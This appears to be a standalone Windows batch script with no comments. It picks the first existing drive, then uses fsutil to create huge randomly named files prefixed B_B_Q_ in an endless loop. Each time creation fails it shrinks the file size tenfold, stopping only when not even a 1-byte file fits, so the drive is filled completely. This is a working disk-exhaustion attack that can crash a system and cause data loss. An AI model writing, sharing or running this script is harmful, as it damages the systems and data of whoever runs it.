@echo off

setlocal enabledelayedexpansion

set file=0
set bigger=10000000000000

set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

FOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
  SET Disk=%%d
  IF EXIST "%%d:\\" (
    GOTO start
  )
)

:start
set /a file=!file!+1
set "randomName="
for /l %%a in (1,1,12) do (
  set /a "rand=!random! %% 62"
  for %%b in (!rand!) do set "randomName=!randomName!!characters:~%%b,1!"
)
fsutil file createnew %Disk%:\B_B_Q_!randomName! %bigger% >nul
IF NOT EXIST "%Disk%:\B_B_Q_!randomName!" (goto bigger)
goto start

:bigger
if /i "%bigger%"=="1" goto exit
if /i "%bigger%"=="10" set bigger=1
if /i "%bigger%"=="100" set bigger=10
if /i "%bigger%"=="1000" set bigger=100
if /i "%bigger%"=="10000" set bigger=1000
if /i "%bigger%"=="100000" set bigger=10000
if /i "%bigger%"=="1000000" set bigger=100000
if /i "%bigger%"=="10000000" set bigger=1000000
if /i "%bigger%"=="100000000" set bigger=10000000
if /i "%bigger%"=="1000000000" set bigger=100000000
if /i "%bigger%"=="10000000000" set bigger=1000000000
if /i "%bigger%"=="100000000000" set bigger=10000000000
if /i "%bigger%"=="1000000000000" set bigger=100000000000
if /i "%bigger%"=="10000000000000" set bigger=1000000000000
goto start

:exit
